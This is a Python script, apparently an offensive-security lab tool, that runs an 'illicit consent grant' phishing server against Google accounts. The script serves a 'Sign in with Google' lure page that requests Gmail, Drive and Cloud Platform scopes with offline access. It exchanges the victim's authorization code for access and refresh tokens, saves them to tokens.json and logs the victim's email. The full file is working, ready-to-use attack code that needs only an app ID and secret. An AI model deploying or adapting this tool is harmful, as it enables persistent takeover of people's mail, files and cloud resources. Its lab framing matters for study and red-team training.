#!/usr/bin/env python3
"""
Illicit Consent Grant -- Google OAuth2 Server (localhost)
=========================================================
Simulates a malicious application requesting OAuth2 consent from a victim
to obtain an access_token + refresh_token.

Usage:
    1. Create an OAuth2 app in Google Cloud Console:
       https://console.cloud.google.com/apis/credentials
       - Type: Web application
       - Redirect URI: http://localhost:8080/callback
    2. Copy CLIENT_ID and CLIENT_SECRET below
    3. Launch: python3 oauth_app.py
    4. Open the lure URL in a browser
    5. The victim accepts the consent
    6. Tokens are stored in tokens.json
"""

import os
import sys
import json
import base64
import urllib.parse
import urllib.request
from http.server import HTTPServer, BaseHTTPRequestHandler

# =============================================================================
# CONFIGURATION
# =============================================================================
CLIENT_ID     = os.environ.get("GOOGLE_CLIENT_ID",     "YOUR_CLIENT_ID.apps.googleusercontent.com") #Change this
CLIENT_SECRET = os.environ.get("GOOGLE_CLIENT_SECRET", "YOUR_CLIENT_SECRET") #Change this
REDIRECT_URI  = "http://localhost:8080/callback" #Change localhost to your domain
LISTEN_HOST   = "0.0.0.0"
LISTEN_PORT   = 8080

# Requested scopes -- adjust per scenario
# Non-sensitive : openid, email, profile, userinfo.email
# Sensitive     : calendar.readonly, cloud-platform, and most of the GCP endpoints
# Restricted    : drive.readonly, gmail.readonly, gmail.modify, drive, and most of the GWS endpoints (require security assessment in production)
SCOPES = [
    "openid",
    "email",
    "profile",
    "https://www.googleapis.com/auth/userinfo.email",
    # Uncomment for email access:
    "https://www.googleapis.com/auth/gmail.readonly",
    # Uncomment for Drive access:
    "https://www.googleapis.com/auth/drive",
    # Uncomment for GCP access:
    "https://www.googleapis.com/auth/cloud-platform",
]

# Token storage file
TOKENS_FILE = "tokens.json"

# =============================================================================
# UTILITIES
# =============================================================================

def build_consent_url(state: str = "lab_state_123") -> str:
    """Build the Google OAuth2 consent URL."""
    params = {
        "client_id":     CLIENT_ID,
        "redirect_uri":  REDIRECT_URI,
        "scope":         " ".join(SCOPES),
        "response_type": "code",
        "access_type":   "offline",   # Request a refresh_token
        "prompt":        "consent",   # Force re-consent
        "state":         state,
    }
    return "https://accounts.google.com/o/oauth2/v2/auth?" + urllib.parse.urlencode(params)


def exchange_code_for_tokens(auth_code: str) -> dict:
    """Exchange the authorization code for tokens."""
    data = urllib.parse.urlencode({
        "code":          auth_code,
        "client_id":     CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "redirect_uri":  REDIRECT_URI,
        "grant_type":    "authorization_code",
    }).encode("utf-8")

    req = urllib.request.Request(
        "https://oauth2.googleapis.com/token",
        data=data,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        method="POST",
    )

    with urllib.request.urlopen(req, timeout=30) as resp:
        return json.loads(resp.read().decode("utf-8"))


def save_tokens(tokens: dict):
    """Save tokens to a JSON file."""
    tokens["_metadata"] = {
        "scopes_requested": SCOPES,
        "client_id": CLIENT_ID,
    }
    with open(TOKENS_FILE, "w") as f:
        json.dump(tokens, f, indent=2)
    print(f"[+] Tokens saved to {TOKENS_FILE}")


def decode_id_token(id_token: str) -> dict:
    """Decode the ID token payload (JWT) without signature verification."""
    try:
        payload = id_token.split(".")[1]
        padding = 4 - len(payload) % 4
        if padding != 4:
            payload += "=" * padding
        return json.loads(base64.b64decode(payload).decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

# =============================================================================
# HTTP SERVER
# =============================================================================

class OAuthHandler(BaseHTTPRequestHandler):
    """Minimal HTTP handler for the OAuth2 flow."""

    def log_message(self, fmt, *args):
        print(f"[HTTP] {fmt % args}")

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)

        # ------------------------------------------------------------------
        # Landing page -- generates the consent link
        # ------------------------------------------------------------------
        if parsed.path == "/":
            consent_url = build_consent_url()
            body = f"""<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Auth</title>
<style>
  body {{ font-family: Arial,sans-serif; background:#0d1117; color:#e6edf3;
         display:flex; flex-direction:column; align-items:center; justify-content:center;
         height:100vh; margin:0; }}
  .box {{ background:#161b22; border:1px solid #30363d; border-radius:8px;
         padding:40px; max-width:600px; text-align:center; }}
  h1 {{ color:#f0883e; }}
  a.btn {{ display:inline-block; background:#238636; color:#fff; padding:14px 28px;
          border-radius:6px; text-decoration:none; font-weight:bold; margin-top:20px; }}
  a.btn:hover {{ background:#2ea043; }}
  .scopes {{ text-align:left; background:#0d1117; padding:15px; border-radius:6px;
            margin-top:20px; font-family:monospace; font-size:13px; }}
  .scopes li {{ margin:4px 0; color:#8b949e; }}
</style></head>
<body>
  <div class="box">
    <h1>Sign-in required</h1>
    <p>Please authenticate with your Google account to continue.</p>
    <a class="btn" href="{consent_url}">Sign in with Google</a>
    <div class="scopes">
      <strong>Requested scopes:</strong>
      <ul>
        {"".join(f"<li>{s}</li>" for s in SCOPES)}
      </ul>
    </div>
  </div>
</body>
</html>"""
            self._send_html(200, body)

        # ------------------------------------------------------------------
        # OAuth2 callback -- receives the authorization code
        # ------------------------------------------------------------------
        elif parsed.path == "/callback":
            qs = urllib.parse.parse_qs(parsed.query)
            error = qs.get("error", [None])[0]
            auth_code = qs.get("code", [None])[0]
            state = qs.get("state", [None])[0]

            if error:
                self._send_html(400, f"<h1>OAuth error: {error}</h1>")
                return

            if not auth_code:
                self._send_html(400, "<h1>Missing authorization code</h1>")
                return

            print(f"[+] Authorization code received: {auth_code[:20]}...")

            try:
                tokens = exchange_code_for_tokens(auth_code)
                save_tokens(tokens)

                id_payload = decode_id_token(tokens.get("id_token", ""))
                email = id_payload.get("email", "N/A")

                body = f"""<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Success</title>
<style>
  body {{ font-family: Arial,sans-serif; background:#0d1117; color:#e6edf3;
         display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }}
  .box {{ background:#161b22; border:1px solid #30363d; border-radius:8px;
         padding:40px; max-width:500px; text-align:center; }}
  h1 {{ color:#3fb950; }} .info {{ color:#8b949e; margin-top:15px; font-size:14px; }}
</style></head>
<body>
  <div class="box">
    <h1>Authentication successful</h1>
    <p>You can close this page.</p>
    <div class="info">
      <p>Email: <strong>{email}</strong></p>
      <p>Access token: <code>{tokens.get('access_token','N/A')[:30]}...</code></p>
      <p>Refresh token: <code>{'YES' if tokens.get('refresh_token') else 'NO'}</code></p>
    </div>
  </div>
</body>
</html>"""
                self._send_html(200, body)
                print(f"[+] Victim authenticated: {email}")
                print(f"[+] Access token: {tokens.get('access_token', 'N/A')[:40]}...")
                print(f"[+] Refresh token: {'PRESENT' if tokens.get('refresh_token') else 'ABSENT'}")

            except Exception as e:
                self._send_html(500, f"<h1>Token exchange error: {e}</h1>")
                print(f"[!] Error: {e}")

        else:
            self._send_html(404, "<h1>404 Not Found</h1>")

    def _send_html(self, code: int, body: str):
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(body.encode("utf-8"))


# =============================================================================
# MAIN
# =============================================================================

def main():
    if CLIENT_ID.startswith("YOUR_") or CLIENT_SECRET.startswith("YOUR_"):
        print("[!] ERROR: You must configure CLIENT_ID and CLIENT_SECRET in this script.")
        print("    Or use the GOOGLE_CLIENT_ID and GOOGLE_CLIENT_SECRET environment variables.")
        print("\n    1. Go to https://console.cloud.google.com/apis/credentials")
        print("    2. Create a 'Web application' OAuth app")
        print("    3. Add http://localhost:8080/callback to the redirect URIs")
        print("    4. Copy the Client ID and Client Secret")
        sys.exit(1)

    server = HTTPServer((LISTEN_HOST, LISTEN_PORT), OAuthHandler)
    print("=" * 70)
    print("  ILLICIT CONSENT GRANT -- Google OAuth2 Server (localhost)")
    print("=" * 70)
    print(f"\n  Listening on : http://{LISTEN_HOST}:{LISTEN_PORT}")
    print(f"  Callback     : {REDIRECT_URI}")
    print(f"  Scopes       : {SCOPES}")
    print(f"\n  Lure URL:")
    print(f"    http://{LISTEN_HOST}:{LISTEN_PORT}/")
    print("\n  Waiting for the victim...")
    print("=" * 70)

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Server stopped.")
        server.shutdown()


if __name__ == "__main__":
    main()
